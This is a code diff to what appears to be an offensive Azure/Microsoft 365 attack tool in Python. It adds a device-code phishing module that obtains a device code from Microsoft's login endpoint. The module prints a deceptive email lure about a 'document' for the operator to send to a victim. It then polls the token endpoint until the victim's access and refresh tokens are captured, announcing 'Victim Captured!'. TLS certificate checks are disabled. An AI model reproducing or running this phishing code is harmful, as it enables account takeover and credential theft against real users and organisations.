@@ -177,6 +177,60 @@ def sendPOSTRequestSprayMSOL(url, user, pwd, resourceMgmt):
         pass
     return object
 
+def sendPOSTRequestDeviceCode():
+    object = {}
+    o = urlparse("https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0")
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    conn = http.client.HTTPSConnection(o.netloc)
+    headers = {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    data = {
+        'client_id': 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+        'resource': 'https://graph.windows.net',
+    }
+    qs = urllib.parse.urlencode(data)
+    conn.request("POST", str(o.path), qs, headers)
+    res = conn.getresponse()
+    object["headers"] = dict(res.getheaders())
+    object["status_code"] = int(res.status)
+    object["response"] = str(res.read().decode("utf-8"))
+    try:
+        object["json"] = json.loads(object["response"])
+    except json.JSONDecodeError:
+        pass
+    return object
+
+def sendPOSTRequestMontiorDeviceCode(code):
+    object = {}
+    o = urlparse("https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0")
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    conn = http.client.HTTPSConnection(o.netloc)
+    headers = {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    data = {
+        'client_id': 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+        'resource': 'https://graph.windows.net',
+        'code': code,
+        'grant_type': 'urn:ietf:params:oauth:grant-type:device_code'
+    }
+    qs = urllib.parse.urlencode(data)
+    conn.request("POST", str(o.path), qs, headers)
+    res = conn.getresponse()
+    object["headers"] = dict(res.getheaders())
+    object["status_code"] = int(res.status)
+    object["response"] = str(res.read().decode("utf-8"))
+    try:
+        object["json"] = json.loads(object["response"])
+    except json.JSONDecodeError:
+        pass
+    return object
+
 def sendPOSTRequestRefreshToken(tenantId, token):
     object = {}
     o = urlparse("https://login.microsoftonline.com/"+str(tenantId)+"/oauth2/v2.0/token")
@@ -326,6 +380,8 @@ def parseUPN():
         data = json.loads(base64.b64decode(b64_string))
         if 'app_displayname' in data:
             return data['app_displayname'] + "@" + data['tid'] 
+        elif 'given_name' in data:
+            return data['family_name'] + " " + data['given_name'] + "@" + data['tid'] 
         return data['upn']
 
 def parseUPNObjectId():
@@ -335,7 +391,13 @@ def parseUPNObjectId():
     else:
         b64_string = Token.split(".")[1]
         b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
-        return json.loads(base64.b64decode(b64_string))['oid']
+        if 'oid' in json.loads(base64.b64decode(b64_string)):
+            return json.loads(base64.b64decode(b64_string))['oid']
+        elif 'appid' in json.loads(base64.b64decode(b64_string)):
+            return json.loads(base64.b64decode(b64_string))['appid']
+        else:
+            print("DeviceId Token not supported. Aborted.")
+            exit(-1)
 
 def parseTenantId():
     global Token
@@ -1429,6 +1491,8 @@ def attackWindow():
         "Token/GenToken",
         "Token/SetToken",
         "Token/RefreshToken",
+        "External/DeviceCodePhising",
+        "External/DeviceCodePhising/Monitor",
         "External/OSINT",
         "External/EmailEnum",
         "External/PasswordSpray",
@@ -1716,6 +1780,41 @@ def attackWindow():
                     print("Done.")
                 else:
                     print("Invalid Service Principle AppId / Secret / TenantId.")
+            elif "External/DeviceCodePhising/Monitor" in ExploitChoosen and mode == "run":
+                DeviceCode = input("Enter DeviceCode to Monitor: ")
+                print("It may take a while.. please be patient...")
+                print("running...")
+                while(True):
+                        res = sendPOSTRequestMontiorDeviceCode(DeviceCode)['json']
+                        if 'error_description' in res:
+                            continue
+                        else:
+                            if 'expired_token' in res:
+                                print("Expired Token, try again!")
+                                break
+                            else:
+                                accessTokenGraph = res
+                                initTokenWithGraph(res['access_token'], accessTokenGraph['access_token'])
+                                initRefreshToken(res['refresh_token'])
+                                print("Victim Captured! Token has been set! Enjoy!")
+                                break
+            elif "External/DeviceCodePhising" in ExploitChoosen and mode == "run":
+                print("Try to create device code authentication link for victim..")
+                token = sendPOSTRequestDeviceCode()
+                htmlmsg = '''
+<html>
+Hi!<br>
+Here is the link to the <a href="https://microsoft.com/devicelogin">document</a>. Use the following code to access: <b>'''+token['json']['user_code']+'''</b>. <br><br>
+</html>
+                '''
+
+                print("Send this HTML message to your victim in email:")
+                print("=====================================")
+                print(htmlmsg)
+                print("=====================================")
+                print("\nUse the following code to capture victim's token:")
+                print(token['json']['device_code'])
+                print("\nUse External/DeviceCodePhising/Monitor. Good luck!")
             elif "Token/GenToken" in ExploitChoosen and mode == "run":
                 print("Trying getting token automatically for you...")
                 AutoGenToken = True
